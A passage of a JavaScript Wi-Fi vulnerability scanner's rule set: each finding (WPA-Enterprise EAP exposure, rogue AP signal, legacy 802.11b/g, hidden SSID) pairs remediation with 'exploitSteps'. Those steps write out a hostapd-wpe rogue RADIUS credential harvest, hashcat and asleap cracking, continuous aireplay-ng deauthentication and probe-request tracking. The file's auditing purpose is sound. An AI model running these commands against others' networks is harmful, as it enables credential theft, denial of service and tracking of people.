          'sudo airmon-ng start wlan0',
          'sudo airodump-ng --essid "{{ssid}}" -w /tmp/cluster wlan0mon',
          '# All BSSIDs logged — compare OUI prefixes against known hardware',
          '# Look up each prefix: curl https://api.macvendors.com/<MAC-prefix>',
        ],
      },
      {
        label: 'Locate rogue AP physically via signal',
        detail: 'Walk the space with monitor mode active. An unauthorized AP signals at maximum strength near its physical location. Unusual signal peaks in unexpected areas reveal rogue hardware.',
        commands: [
          '# Real-time signal tracking:',
          'sudo wavemon',
          '# Or: watch signal while walking:',
          'watch -n 1 "sudo iw dev wlan0 scan | grep -A3 \'{{ssid}}\'"',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Maintain an authorized BSSID allowlist',
        detail: 'Document every authorized AP MAC address. Automate a daily scan that alerts on any BSSID not in the allowlist.',
        commands: [
          '# Capture current BSSIDs:',
          'sudo iw dev wlan0 scan | grep "BSS " | awk \'{print $2}\' | sort > /etc/wifi-auth-bssids.txt',
          '# Daily audit cron:',
          '# iw dev wlan0 scan | grep "BSS " | awk \'{print $2}\' | sort | comm -13 /etc/wifi-auth-bssids.txt -',
        ],
      },
    ],
  },

  {
    id: 'enterprise-eap-exposure',
    match: (n) => (n.authentication || '').toLowerCase().includes('enterprise'),
    severity: 'medium', cvss: 4.5,
    title: 'WPA-Enterprise — EAP Credential Harvest Risk',
    description: (n) => `"${n.ssid || '(Hidden)'}" uses WPA-Enterprise (802.1X/EAP). While stronger than PSK, Enterprise networks using EAP-PEAP or EAP-TTLS are vulnerable to rogue RADIUS server attacks if client devices are not configured to validate the server certificate. An attacker presents a fake AP with a self-signed certificate; misconfigured clients submit MS-CHAPv2 credentials which are crackable offline.`,
    remediation: 'Enforce RADIUS server certificate validation on all clients. Pin the specific CA certificate. Migrate to EAP-TLS (mutual certificate authentication) where possible — no passwords to steal.',
    tags: ['enterprise', '802.1x', 'eap-peap', 'radius-mitm', 'ms-chapv2'],
    exploitSteps: [
      {
        label: 'Deploy rogue RADIUS with hostapd-wpe',
        detail: 'hostapd-wpe creates a fake AP that presents a self-signed certificate during EAP negotiation. Clients without server cert validation will proceed, submitting credentials to the attacker.',
        commands: [
          'sudo apt install hostapd-wpe -y',
          '# Set ssid={{ssid}} in hostapd-wpe.conf',
          'sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf',
          'sudo tail -f /var/log/hostapd-wpe.log',
          '# Credentials appear as: username + MS-CHAPv2 challenge/response',
        ],
      },
      {
        label: 'Crack MS-CHAPv2 credentials offline',
        detail: 'Captured EAP-PEAP credentials are MS-CHAPv2 challenge/response pairs. Crackable with asleap or hashcat in minutes against common passwords.',
        commands: [
          'sudo apt install asleap -y',
          'asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt',
          '# Or convert to hashcat NetNTLMv1 format:',
          'hashcat -m 5500 "<hash>" /usr/share/wordlists/rockyou.txt',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Enforce RADIUS server certificate validation',
        detail: 'All clients must verify the RADIUS server certificate against a pinned CA cert. Without this, clients cannot distinguish your RADIUS server from a rogue one.',
        commands: [
          '# wpa_supplicant.conf (Linux):',
          '# ca_cert="/etc/certs/company-ca.pem"',
          '# subject_match="/CN=radius.company.internal"',
          '',
          '# Windows Group Policy → Wireless → EAP → Validate server cert → pin CA',
        ],
      },
      {
        label: 'Migrate to EAP-TLS (mutual cert auth)',
        detail: 'EAP-TLS uses client certificates for both sides — no password is ever transmitted, nothing to steal.',
        commands: [
          '# wpa_supplicant.conf EAP-TLS:',
          '# eap=TLS',
          '# client_cert="/etc/certs/client.crt"',
          '# private_key="/etc/certs/client.key"',
          '# ca_cert="/etc/certs/company-ca.pem"',
        ],
      },
    ],
  },

  {
    id: 'high-signal-anomaly',
    match: (n) => n.bssids.some(b => b.signal >= 95),
    severity: 'medium', cvss: 5.3,
    title: 'Abnormally High Signal Strength — Possible Rogue AP',
    description: (n) => {
      const high = n.bssids.filter(b => b.signal >= 95)
      return `An access point for "${n.ssid || '(Hidden)'}" is reporting ${high[0]?.signal}% signal — unusually close to maximum. Legitimate APs rarely reach this level unless placed within arm\'s reach of the scanner. This pattern is consistent with a rogue or evil-twin AP positioned physically close to maximize signal dominance and override the legitimate AP during client reconnects.`
    },
    remediation: 'Physically inspect the area for unauthorized AP hardware near the scan point. Verify the BSSID OUI matches your known equipment vendor. If no authorized hardware is nearby, isolate and remove the device.',
    tags: ['rogue-ap', 'evil-twin', 'signal-anomaly', 'physical-security'],
    exploitSteps: [
      {
        label: 'Triangulate the AP location',
        detail: 'Walk the space with monitor mode active. Signal peaks when you are physically closest to the hardware. Use wavemon for real-time signal level display.',
        commands: [
          'sudo airmon-ng start wlan0',
          'wavemon  # graphical real-time signal strength',
          '# Or:',
          'sudo airodump-ng --bssid {{bssid}} wlan0mon',
          '# Walk in a grid — note where signal maximizes',
        ],
      },
      {
        label: 'Verify BSSID OUI against inventory',
        detail: 'Look up the MAC OUI prefix to confirm manufacturer. Cross-reference against your authorized AP inventory. An unexpected vendor = unauthorized hardware.',
        commands: [
          '# Extract OUI from BSSID:',
          'echo "{{bssid}}" | cut -d: -f1-3',
          '# Check vendor:',
          'curl -s "https://api.macvendors.com/{{bssid}}"',
          '# Compare against authorized inventory:',
          'grep "{{bssid}}" /etc/wifi-auth-bssids.txt || echo "NOT IN INVENTORY"',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Physical security sweep',
        detail: 'Inspect all network equipment, wall plates, ceiling tiles, and ethernet drops near the scan location. Rogue APs are often small devices (WiFi Pineapple, Pi with adapter) plugged into existing drops.',
        commands: [
          '# Check switch CAM table for unexpected MACs (Cisco):',
          '# show mac address-table | grep <MAC-vendor-OUI>',
          '',
          '# Nmap with vendor identification:',
          'nmap -sn --script=mac-geolocation <subnet>',
        ],
      },
      {
        label: 'Enable 802.1X on switch ports',
        detail: '802.1X port authentication prevents unauthorized devices from obtaining a wired connection — a rogue AP cannot bridge traffic if it cannot authenticate to the switch.',
        commands: [
          '# Cisco switch 802.1X on access port:',
          '# interface GigabitEthernet0/1',
          '#  dot1x port-control auto',
          '#  authentication host-mode single-host',
        ],
      },
    ],
  },

  // ── Low (additional) ──────────────────────────────────────────────────────

  {
    id: 'non-standard-channel',
    match: (n) => {
      const NON_PREFERRED = new Set([2, 3, 4, 5, 7, 8, 9, 10, 12, 13])
      return n.bssids.some(b => {
        const ch = parseInt(b.channel)
        return !isNaN(ch) && NON_PREFERRED.has(ch)
      })
    },
    severity: 'low', cvss: 3.8,
    title: 'Non-Standard 2.4 GHz Channel — Adjacent-Channel Interference',
    description: (n) => `An access point for "${n.ssid || '(Hidden)'}" is operating on a 2.4 GHz channel other than 1, 6, or 11 — the only three non-overlapping channels in the band. Operating on channels 2–5, 7–10, or 12–13 causes adjacent-channel interference with neighboring networks, degrades throughput, and makes deauthentication injection more reliable for attackers.`,
    remediation: 'Configure all 2.4 GHz APs to use only channels 1, 6, or 11. These are the sole non-overlapping channel options in the 2.4 GHz band worldwide.',
    tags: ['channel-interference', '2.4ghz', 'rf-hygiene', 'deauth-risk'],
    exploitSteps: [
      {
        label: 'Exploit interference for deauth amplification',
        detail: 'Adjacent-channel interference increases background noise floor. Deauth frames injected on a congested non-preferred channel have a higher delivery probability, making forced client disconnection more reliable.',
        commands: [
          'sudo airmon-ng start wlan0',
          'sudo airodump-ng --bssid {{bssid}} --channel {{channel}} wlan0mon',
          '# Deauth (interference increases effectiveness):',
          'sudo aireplay-ng --deauth 3 -a {{bssid}} wlan0mon',
          '# Watch for handshake capture in airodump',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Set channel to 1, 6, or 11 only',
        detail: 'These are the only three non-overlapping 20 MHz channels in the 2.4 GHz band. All other channels overlap with at least one of these.',
        commands: [
          '# Router admin panel → Wireless → Channel: 1, 6, or 11',
          '',
          '# hostapd (Linux):',
          'sudo sed -i "s/^channel=.*/channel=6/" /etc/hostapd/hostapd.conf',
          'sudo systemctl restart hostapd',
        ],
      },
    ],
  },

  {
    id: 'weak-radio-standard',
    match: (n) => {
      return n.bssids.some(b => {
        const rt = (b.radioType || '').toLowerCase().trim()
        return (
          rt === '802.11b' || rt === '802.11g' || rt === '802.11b/g' ||
          (rt.startsWith('802.11b') && !rt.includes('n') && !rt.includes('ac') && !rt.includes('ax')) ||
          (rt.startsWith('802.11g') && !rt.includes('n') && !rt.includes('ac') && !rt.includes('ax'))
        )
      })
    },
    severity: 'low', cvss: 3.5,
    title: 'Legacy Radio Standard — 802.11b/g Detected',
    description: (n) => `An access point for "${n.ssid || '(Hidden)'}" is advertising a legacy 802.11b (1999) or 802.11g (2003) radio type. These protocols use unauthenticated management frames, making deauthentication and disassociation frame injection trivially easy. They also force all modern clients to slow to legacy speeds when connected to the same AP.`,
    remediation: 'Disable 802.11b and 802.11g support in router settings. Require a minimum of 802.11n (Wi-Fi 4). Any device requiring only 802.11b/g was manufactured before 2007 and should be replaced.',
    tags: ['legacy-protocol', '802.11b', '802.11g', 'unauth-management-frames'],
    exploitSteps: [
      {
        label: 'Inject unauthenticated deauth frames',
        detail: '802.11b/g management frames have no authentication. Any nearby device can send deauth frames that appear to originate from the AP. Clients cannot verify the source — a single frame disconnects a client.',
        commands: [
          'sudo airmon-ng start wlan0 && sudo airmon-ng check kill',
          '# Single deauth (sufficient on legacy networks):',
          'sudo aireplay-ng --deauth 1 -a {{bssid}} wlan0mon',
          '',
          '# Continuous denial of service:',
          'sudo aireplay-ng --deauth 0 -a {{bssid}} wlan0mon',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Disable 802.11b/g, require 802.11n minimum',
        detail: 'Remove legacy radio modes. Every device manufactured after 2009 supports 802.11n at minimum.',
        commands: [
          '# Router admin panel → Wireless → Mode:',
          '# Change: "b/g/n" → "n only"  or  "n/ac"  or  "n/ac/ax"',
          '',
          '# hostapd 802.11n-only on 2.4 GHz:',
          '# hw_mode=g',
          '# ieee80211n=1',
          '# require_ht=1  # reject clients without HT (11n) capability',
        ],
      },
    ],
  },

  // ── Low ──────────────────────────────────────────────────────────────────

  {
    id: 'hidden-ssid',
    match: (n) => !n.ssid,
    severity: 'low', cvss: 2.0,
    title: 'Hidden SSID — Ineffective Obscurity Measure',
    description: 'A network is operating with a blank SSID (hidden network). This is a widely misunderstood configuration that provides no real security benefit. Hidden networks are still fully visible in passive scans — they just lack a displayed name. Connected clients actively probe for the hidden SSID from every location they visit, leaking the network name continuously.',
    remediation: 'Re-enable SSID broadcasting. Security should come from strong encryption (WPA3 + strong passphrase) — not from hiding the network name. SSID hiding also causes connection issues on many devices.',
    tags: ['security-by-obscurity', 'ssid-probing', 'privacy'],
    exploitSteps: [
      {
        label: 'Discover SSID from beacon frames',
        detail: 'Hidden APs still send beacon frames — they just omit the SSID field. When any authorized client reconnects, it transmits the SSID in plaintext in the association request. A single deauth reveals it.',
        commands: [
          'sudo airmon-ng start wlan0',
          'sudo airodump-ng wlan0mon',
          '# Hidden network appears with blank ESSID — note the BSSID',
          '# Wait for a client to connect, or force one to reconnect:',
          'sudo aireplay-ng --deauth 2 -a {{bssid}} wlan0mon',
          '# After reconnect: ESSID column populates with the real SSID',
        ],
      },
      {
        label: 'Track probing devices',
        detail: 'Every device that has ever connected to this hidden network sends probe requests broadcasting the SSID wherever it goes. These are trackable across public WiFi, revealing the user\'s home/office network name.',
        commands: [
          '# Capture probe requests revealing the hidden SSID:',
          'tshark -i wlan0mon -f "type mgt subtype probe-req" -T fields -e wlan.sa -e wlan_mgt.ssid',
          '# Shows: <device MAC> → <hidden SSID> requests from anywhere in range',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Enable SSID broadcasting',
        detail: 'Unhide the network. The SSID being visible to a scanner does not help an attacker who cannot join without the passphrase. SSID hiding only hurts usability.',
        commands: [
          '# Router admin panel:',
          '# Wireless → SSID Broadcast: Enabled',
          '# Or: "Hide SSID" checkbox → unchecked',
          '',
          '# For hostapd:',
          'sudo sed -i "s/ignore_broadcast_ssid=.*/ignore_broadcast_ssid=0/" /etc/hostapd/hostapd.conf',
          'sudo systemctl restart hostapd',
        ],
      },
      {
        label: 'Rely on strong encryption instead',
        detail: 'WPA3 with a strong passphrase is the correct security layer. An attacker who knows the SSID name still cannot connect without the passphrase.',
        commands: [
          '# Enable WPA3-Personal in router admin panel',
          '# Or WPA2-Personal with AES and a 20+ character random passphrase',
          '# The SSID name being public is irrelevant with proper encryption',
        ],
      },
    ],
  },
]

// ── Analysis engine ───────────────────────────────────────────────────────────

export function analyzeNetworks(networks) {
  const findings = []
  let id = 0

  for (const network of networks) {
    for (const rule of WIFI_RULES) {
      if (!rule.match(network, networks)) continue
      findings.push({
        id: ++id,
        ssid: network.ssid,
        authentication: network.authentication,
        encryption: network.encryption,
        bssids: network.bssids,
        severity: rule.severity,
        cvss: rule.cvss,
        title: rule.title,
        description: typeof rule.description === 'function' ? rule.description(network) : rule.description,
        remediation: rule.remediation,
        tags: rule.tags,
        exploitSteps: rule.exploitSteps || [],
        patchSteps: rule.patchSteps || [],
      })
    }
  }

  const weight = { critical: 4, high: 3, medium: 2, low: 1, info: 0 }
  findings.sort((a, b) => (weight[b.severity] || 0) - (weight[a.severity] || 0))
  return findings
}
